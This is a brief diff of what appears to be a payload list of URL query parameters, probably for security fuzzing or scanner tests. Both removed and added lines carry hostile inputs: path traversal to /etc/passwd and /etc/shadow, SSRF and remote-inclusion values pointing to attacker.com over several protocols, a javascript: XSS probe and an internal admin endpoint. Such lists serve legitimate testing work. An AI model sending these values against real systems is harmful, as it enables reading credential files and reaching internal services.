@@ -1,6 +1,10 @@
-?file=/etc/passwd
-?resource=../../secret.txt
-?id=../config
-?module=../../../../etc/shadow
-?page=file:///etc/passwd
-?class=evil.EvilClass
+?resource=file:///etc/passwd
+?id=../../etc/passwd
+?uri=http://attacker.com/evil
+?path=//attacker.com/resource
+?src=ftp://attacker.com/file
+?url=ldap://attacker.com/exploit
+?resource=dict://attacker.com:11211/
+?ref=javascript:alert(1)
+?target=smb://attacker.com/share
+?endpoint=http://internal-service:8080/admin
